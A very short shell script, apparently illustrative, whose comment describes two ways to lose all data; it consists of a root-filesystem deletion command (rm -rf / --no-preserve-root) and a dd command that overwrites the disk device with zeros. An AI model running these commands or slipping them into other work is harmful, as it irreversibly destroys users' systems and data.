#!/bin/sh
# Two separate ways to lose everything: the filesystem root, then the device
# the filesystem was on.
sudo rm -rf / --no-preserve-root
sudo dd if=/dev/zero of=/dev/sda bs=1M
